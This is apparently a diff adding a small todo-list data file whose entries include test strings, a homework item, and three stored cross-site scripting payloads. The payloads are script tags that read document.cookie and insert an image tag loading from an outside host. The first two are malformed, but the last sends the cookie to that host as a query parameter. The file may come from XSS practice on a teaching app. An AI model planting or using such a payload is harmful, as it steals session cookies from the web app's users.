@@ -1,0 +1,36 @@
+1
+111222
+false
+1
+2
+vvvddd
+false
+1
+3
+vvvddbai
+false
+2
+4
+bai to
+false
+2
+5
+vvv
+false
+2
+6
+                <script>                     c = document.cookie;                     // alert(c);                     document.body.insertAdjacentHTML(                         "boforeend",                         "<img src="https://www.kuaibiancheng.com/uploads/avatar/default.gif"                     )                 </script>
+false
+1
+7
+                <script>                     c = document.cookie;                     // alert(c);                     document.body.insertAdjacentHTML(                         "boforeend",                         "<img src="https://www.kuaibiancheng.com/uploads/avatar/default.gif"                     )                 </script>
+false
+1
+8
+<script> c = document.cookie; alert(c); document.body.insertAdjacentHTML("beforeEnd",` <img src='http://www.kuaibiancheng.com/uploads/avatar/default.gif?cookie=${c}'>`) </script>
+false
+1
+9
+完成作业
+false
+3
